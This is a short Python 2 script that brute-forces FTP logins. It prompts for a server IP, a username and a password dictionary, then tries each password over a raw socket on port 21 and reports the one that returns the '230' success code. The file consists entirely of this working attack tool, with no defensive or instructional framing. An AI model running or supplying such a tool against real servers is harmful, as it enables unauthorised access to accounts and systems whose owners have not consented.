import socket
import re
import sys

found = False

def connect(ip, user, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[*] Trying to connect on " + ip + ":21 with user: " + user + ", and password: " + passwd
    sock.connect((ip, 21))
    data = sock.recv(1024)
    sock.send('USER ' + user + '\r\n')
    data = sock.recv(1024)
    sock.send('PASS ' + passwd + '\r\n')
    data = sock.recv(1024)
    sock.send('quit\r\n')
    sock.close()
    return data

ip_server = raw_input("Insert server ip: ")
username = raw_input("Insert FTP username: ")
dictionary = raw_input("Insert dictionary file (leave blank for use default dictionary): ")
passwords = ""
if dictionary == "":
    try:
        passwords = open("dictionarys/default", "r")
    except:
        print "[!] Error: Couldn't open file!"
else:
    try:
        passwords = open(dictionary, "r")
    except:
        print "[!] Error: Couldn't open file!"

passwd_result = ""
for password in passwords:
    if found == False:
        result = connect(ip_server, username, password)
        if "230" in result:
            passwd_result = password
            found = True
    else:
        print "[*] Password found! It is: " + passwd_result
        quit()

if found == False:
    print "[!] Password not found!"